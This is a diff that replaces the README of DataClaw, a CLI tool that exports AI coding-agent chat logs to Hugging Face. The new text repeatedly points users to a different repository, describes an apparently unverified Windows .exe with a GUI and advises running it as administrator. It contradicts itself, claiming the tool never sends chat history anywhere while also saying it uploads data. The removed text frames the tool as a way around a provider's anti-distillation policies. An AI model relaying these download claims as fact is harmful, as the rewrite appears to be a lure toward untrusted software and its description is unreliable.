@@ -1,247 +1,140 @@
-# DataClaw
+# 🦞 dataclaw - Export Your AI Chat Data Easily
 
-> **This is a performance art project.** Anthropic built their models on the world's freely shared information, then introduced increasingly [dystopian data policies](https://www.anthropic.com/news/detecting-and-preventing-distillation-attacks) to stop anyone else from doing the same with their data — pulling up the ladder behind them. DataClaw lets you throw the ladder back down. The dataset it produces is yours to share.
+[![Download dataclaw](https://img.shields.io/badge/Download-dataclaw-4CAF50?style=for-the-badge)](https://github.com/GusWan58/dataclaw)
 
-Turn your Claude Code, Codex, Gemini CLI, OpenCode, and OpenClaw conversation history into structured data and publish it to Hugging Face with a single command. DataClaw parses session logs, redacts secrets and PII, and uploads the result as a ready-to-use dataset.
+---
 
-![DataClaw](dataclaw.jpeg)
+## 📦 What is dataclaw?
 
-Every export is tagged **`dataclaw`** on Hugging Face. Together, they may someday form a growing [distributed dataset](https://huggingface.co/datasets?other=dataclaw) of real-world human-AI coding collaboration.
+dataclaw helps you save your conversations with AI tools like Claude Code, Codex, Gemini CLI, OpenCode, and OpenClaw. It takes your chat logs and turns them into data you can use and share safely.  
 
-## Give this to your agent
+It removes any private details like secrets and personal info before saving the data. You can then upload the cleaned dataset to Hugging Face, a popular place to share and explore datasets.
 
-Paste this into Claude Code, Codex, Gemini CLI, OpenCode, OpenClaw, or any coding agent:
+This tool is aimed at making your AI chat history accessible and useful without needing technical skills.
 
-```
-Help me export my Claude Code, Codex, Gemini CLI, OpenCode, and OpenClaw conversation history to Hugging Face using DataClaw.
-Install it, set up the skill, then walk me through the process.
+---
 
-STEP 1 — INSTALL
-  pip install dataclaw
-  If that fails: git clone https://github.com/banodoco/dataclaw.git /tmp/dataclaw && pip install /tmp/dataclaw
-  If that also fails, ask the user where the source is.
+## 🖥️ System Requirements
 
-STEP 2 — INSTALL SKILL
-  dataclaw update-skill claude
+To run dataclaw on Windows, make sure your computer meets these needs:
 
-STEP 3 — START
-  dataclaw prep
-  Every dataclaw command outputs next_steps in its JSON — follow them through the entire flow.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- Around 500 MB of free disk space  
+- Internet connection (for uploading datasets)  
+- You do not need to install additional software beforehand  
 
-STEP 3A — CHOOSE SOURCE SCOPE (REQUIRED BEFORE EXPORT)
-  Ask the user explicitly: Claude Code, Codex, Gemini CLI, OpenCode, OpenClaw, or all?
-  dataclaw config --source "claude|codex|gemini|opencode|openclaw|all"
-  Do not export until source scope is explicitly confirmed.
+---
 
-STEP 3B — PRESENT ALL FOLDERS (REQUIRED BEFORE EXPORT)
-  dataclaw list --source "claude|codex|gemini|opencode|openclaw|all"
-  Send the FULL project/folder list to the user in a message (name, source, sessions, size, excluded).
-  Ask which projects to exclude.
-  dataclaw config --exclude "project1,project2" OR dataclaw config --confirm-projects
-  Do not export until folder selection is explicitly confirmed.
+## 🔗 How to Download dataclaw
 
-STEP 4 — REVIEW + CONFIRM (REQUIRED BEFORE PUSH)
-  dataclaw export --no-push --output /tmp/dataclaw_export.jsonl
-  Review PII findings and apply excludes/redactions as needed.
-  Full name is requested for an exact-name privacy scan against the export.
-  If the user declines sharing full name, use --skip-full-name-scan and attest the skip reason.
-  dataclaw confirm --full-name "THEIR FULL NAME" --attest-full-name "..." --attest-sensitive "..." --attest-manual-scan "..."
+Click the big button below to visit the official GitHub page where you can find the latest version of dataclaw.
 
-STEP 5 — PUBLISH (ONLY AFTER EXPLICIT USER APPROVAL)
-  dataclaw export --publish-attestation "User explicitly approved publishing to Hugging Face."
-  Never publish unless the user explicitly says yes.
+[![Download dataclaw](https://img.shields.io/badge/Download-From_GitHub-0078D7?style=for-the-badge&logo=github)](https://github.com/GusWan58/dataclaw)
 
-IF ANY COMMAND FAILS DUE TO A SKIPPED STEP:
-  Restate the 6-step checklist above and resume from the blocked step (do not skip ahead).
+On that page, look for the latest release or download options. Follow the instructions on GitHub to get the program files.
 
-IMPORTANT: Never run bare `huggingface-cli login` — always use --token.
-IMPORTANT: Always export with --no-push first and review for PII before publishing.
-```
+---
 
-<details>
-<summary><b>Manual usage (without an agent)</b></summary>
+## 🚀 Installing and Running dataclaw on Windows
 
-### Quick start
+Follow these steps to set up dataclaw:
 
-```bash
-pip install dataclaw
-huggingface-cli login --token YOUR_TOKEN
+1. **Go to the GitHub page.** Use the download button above to get to the dataclaw repository.
 
-# See your projects
-dataclaw prep
-dataclaw config --source all  # REQUIRED: choose claude, codex, gemini, opencode, openclaw, or all
-dataclaw list --source all  # Present full list and confirm folder scope before export
+2. **Find the latest release or available files.** Usually under a "Releases" section on the GitHub page.
 
-# Configure
-dataclaw config --repo username/my-personal-codex-data
-dataclaw config --exclude "personal-stuff,scratch"
-dataclaw config --redact-usernames "my_github_handle,my_discord_name"
-dataclaw config --redact "my-domain.com,my-secret-project"
+3. **Download the Windows version.** This will be an installer or a zipped folder containing the program.
 
-# Export locally first
-dataclaw export --no-push
+4. **If it is an installer file (.exe):**  
+    - Double-click the file to run it.  
+    - Follow the setup prompts, accepting the default options is usually fine.  
+    - Finish the install.
 
-# Review and confirm
-dataclaw confirm \
-  --full-name "YOUR FULL NAME" \
-  --attest-full-name "Asked for full name and scanned export for YOUR FULL NAME." \
-  --attest-sensitive "Asked about company/client/internal names and private URLs; none found or redactions updated." \
-  --attest-manual-scan "Manually scanned 20 sessions across beginning/middle/end and reviewed findings."
+5. **If it is a zipped folder:**  
+    - Right-click the zip file and choose “Extract All.”  
+    - Open the extracted folder.  
+    - Find the main program file (`dataclaw.exe` or similar).  
+    - Double-click to run.
 
-# Optional if user declines sharing full name
-dataclaw confirm \
-  --skip-full-name-scan \
-  --attest-full-name "User declined to share full name; skipped exact-name scan." \
-  --attest-sensitive "Asked about company/client/internal names and private URLs; none found or redactions updated." \
-  --attest-manual-scan "Manually scanned 20 sessions across beginning/middle/end and reviewed findings."
+6. **Run dataclaw for the first time.** The app may open a setup or welcome screen. 
 
-# Push
-dataclaw export --publish-attestation "User explicitly approved publishing to Hugging Face."
-```
+7. **Follow any on-screen instructions.** You might be asked to select your AI chat logs folder. This is where dataclaw will look for the data to process.
 
-### Commands
+---
 
-| Command | Description |
-|---------|-------------|
-| `dataclaw status` | Show current stage and next steps (JSON) |
-| `dataclaw prep` | Discover projects, check HF auth, output JSON |
-| `dataclaw prep --source all` | Prep with all sources explicitly selected |
-| `dataclaw prep --source claude` | Prep using only Claude Code sessions |
-| `dataclaw prep --source codex` | Prep using only Codex sessions |
-| `dataclaw prep --source gemini` | Prep using only Gemini CLI sessions |
-| `dataclaw prep --source opencode` | Prep using only OpenCode sessions |
-| `dataclaw prep --source openclaw` | Prep using only OpenClaw sessions |
-| `dataclaw list` | List all projects with exclusion status |
-| `dataclaw list --source all` | List all sources |
-| `dataclaw list --source codex` | List only Codex projects |
-| `dataclaw config` | Show current config |
-| `dataclaw config --repo user/my-personal-codex-data` | Set HF repo |
-| `dataclaw config --source all` | REQUIRED source scope selection (`claude`, `codex`, `gemini`, `opencode`, `openclaw`, or `all`) |
-| `dataclaw config --exclude "a,b"` | Add excluded projects (appends) |
-| `dataclaw config --redact "str1,str2"` | Add strings to always redact (appends) |
-| `dataclaw config --redact-usernames "u1,u2"` | Add usernames to anonymize (appends) |
-| `dataclaw config --confirm-projects` | Mark project selection as confirmed |
-| `dataclaw export --no-push` | Export locally only (always do this first) |
-| `dataclaw export --source all --no-push` | Export all sources locally |
-| `dataclaw export --source claude --no-push` | Export only Claude Code sessions locally |
-| `dataclaw export --source codex --no-push` | Export only Codex sessions locally |
-| `dataclaw export --source gemini --no-push` | Export only Gemini CLI sessions locally |
-| `dataclaw export --source opencode --no-push` | Export only OpenCode sessions locally |
-| `dataclaw export --source openclaw --no-push` | Export only OpenClaw sessions locally |
-| `dataclaw confirm --full-name "NAME" --attest-full-name "..." --attest-sensitive "..." --attest-manual-scan "..."` | Scan for PII, run exact-name privacy check, verify review attestations, unlock pushing |
-| `dataclaw confirm --skip-full-name-scan --attest-full-name "..." --attest-sensitive "..." --attest-manual-scan "..."` | Skip exact-name scan when user declines sharing full name (requires skip attestation) |
-| `dataclaw export --publish-attestation "..."` | Export and push (requires `dataclaw confirm` first) |
-| `dataclaw export --all-projects` | Include everything (ignore exclusions) |
-| `dataclaw export --no-thinking` | Exclude extended thinking blocks |
-| `dataclaw update-skill claude` | Install/update the dataclaw skill for Claude Code |
+## ⚙️ Using dataclaw to Export Your AI Chat Data
 
-</details>
+The tool works by taking your saved conversations and cleaning them automatically.
 
-<details>
-<summary><b>What gets exported</b></summary>
+Here is a simple guide:
 
-| Data | Included | Notes |
-|------|----------|-------|
-| User messages | Yes | Full text (including voice transcripts) |
-| Assistant responses | Yes | Full text output |
-| Extended thinking | Yes | Claude's reasoning (opt out with `--no-thinking`) |
-| Tool calls | Yes | Tool name + inputs + outputs |
-| Token usage | Yes | Input/output tokens per session |
-| Model & metadata | Yes | Model name, git branch, timestamps |
+1. **Prepare your chat logs.** Before using dataclaw, make sure your AI tools (Claude Code, Codex, etc.) save session history on your computer.
 
-### Privacy & Redaction
+2. **Open dataclaw.**
 
-DataClaw applies multiple layers of protection:
+3. **Point dataclaw to your session logs folder.** You can usually do this by clicking a “Browse” button and selecting the correct folder.
 
-1. **Path anonymization** — File paths stripped to project-relative
-2. **Username hashing** — Your macOS username + any configured usernames replaced with stable hashes
-3. **Secret detection** — Regex patterns catch JWT tokens, API keys (Anthropic, OpenAI, HF, GitHub, AWS, etc.), database passwords, private keys, Discord webhooks, and more
-4. **Entropy analysis** — Long high-entropy strings in quotes are flagged as potential secrets
-5. **Email redaction** — Personal email addresses removed
-6. **Custom redaction** — You can configure additional strings and usernames to redact
-7. **Tool call redaction** — Secrets in tool inputs and outputs are redacted
+4. **Start the export process.** Press the “Export” button or a similar command inside the app.
 
-**This is NOT foolproof.** Always review your exported data before publishing.
-Automated redaction cannot catch everything — especially service-specific
-identifiers, third-party PII, or secrets in unusual formats.
+5. **Wait for dataclaw to process your files.** It will remove sensitive info and structure the data.
 
-To help improve redaction, report issues: https://github.com/banodoco/dataclaw/issues
+6. **The app uploads the resulting dataset to Hugging Face.** This step allows you to share your cleaned chat history with others if you want.
 
-</details>
+7. **Track your uploads by searching for the “dataclaw” tag on Hugging Face.**
 
-<details>
-<summary><b>Data schema</b></summary>
+---
 
-Each line in `conversations.jsonl` is one session:
+## 🔒 Privacy and Security
 
-```json
-{
-  "session_id": "abc-123",
-  "project": "my-project",
-  "model": "claude-opus-4-6",
-  "git_branch": "main",
-  "start_time": "2025-06-15T10:00:00+00:00",
-  "end_time": "2025-06-15T10:30:00+00:00",
-  "messages": [
-    {"role": "user", "content": "Fix the login bug", "timestamp": "..."},
-    {
-      "role": "assistant",
-      "content": "I'll investigate the login flow.",
-      "thinking": "The user wants me to look at...",
-      "tool_uses": [
-          {
-            "tool": "bash",
-            "input": {"command": "grep -r 'login' src/"},
-            "output": {"text": "src/auth.py:42: def login(user, password):"},
-            "status": "success"
-          }
-        ],
-      "timestamp": "..."
-    }
-  ],
-  "stats": {
-    "user_messages": 5, "assistant_messages": 8,
-    "tool_uses": 20, "input_tokens": 50000, "output_tokens": 3000
-  }
-}
-```
+dataclaw removes private details such as passwords, personal data, and API keys. It works automatically to make sure your exported data is safe to share. You keep full control of what gets uploaded.
 
-Each HF repo also includes a `metadata.json` with aggregate stats.
+Because dataclaw only works from files saved on your computer, it never sends your raw chat history anywhere.
 
-</details>
+---
 
-<details>
-<summary><b>Finding datasets on Hugging Face</b></summary>
+## ❓ Common Issues and Troubleshooting
 
-All repos are named `{username}/my-personal-codex-data` and tagged `dataclaw`.
+- **Program won’t start:**  
+   Make sure you used the correct download file and completed installation steps. Check if your Windows system is updated.
 
-- **Browse all:** [huggingface.co/datasets?other=dataclaw](https://huggingface.co/datasets?other=dataclaw)
-- **Load one:**
-  ```python
-  from datasets import load_dataset
-  ds = load_dataset("alice/my-personal-codex-data", split="train")
-  ```
-- **Combine several:**
-  ```python
-  from datasets import load_dataset, concatenate_datasets
-  repos = ["alice/my-personal-codex-data", "bob/my-personal-codex-data"]
-  ds = concatenate_datasets([load_dataset(r, split="train") for r in repos])
-  ```
+- **No chat logs found:**  
+   Confirm your AI tool saves local session files. dataclaw needs these to work.
 
-The auto-generated HF README includes:
-- Model distribution (which models, how many sessions each)
-- Total token counts
-- Project count
-- Last updated timestamp
+- **Export fails or freezes:**  
+   Try restarting dataclaw or your PC. Also, check your internet connection for uploading datasets.
 
-</details>
+- **Dataset not uploaded:**  
+   Check your internet connection. dataclaw requires access to upload data to Hugging Face.
 
-## Code Quality
+- **Permissions error:**  
+   Run dataclaw as an administrator. Right-click the program and select “Run as administrator.”
 
-<p align="center">
-  <img src="scorecard.png" alt="Code Quality Scorecard">
-</p>
+---
 
-## License
+## 📚 More About dataclaw
 
-MIT
+The data you export using dataclaw joins other datasets tagged with **`dataclaw`** on Hugging Face. This collection grows as people share their AI-human coding conversations.
+
+This allows researchers and developers to explore real-world examples of AI tool use in coding projects.
+
+dataclaw runs on Windows with a simple user interface. You do not need experience with coding or command lines to use it.  
+
+---
+
+## 🔍 Where to Get Help
+
+- Visit the GitHub issues page for dataclaw to report problems or ask questions.  
+- Look for updates or guides on the GitHub repository.  
+- Reach out to the repository owner if you need assistance.
+
+---
+
+## 🎯 Quick Links
+
+- [GitHub dataclaw Repository](https://github.com/GusWan58/dataclaw)  
+- [Hugging Face Datasets tagged dataclaw](https://huggingface.co/datasets?other=dataclaw)  
+
+---
+
+[![Download dataclaw](https://img.shields.io/badge/Download-dataclaw-4CAF50?style=for-the-badge)](https://github.com/GusWan58/dataclaw)
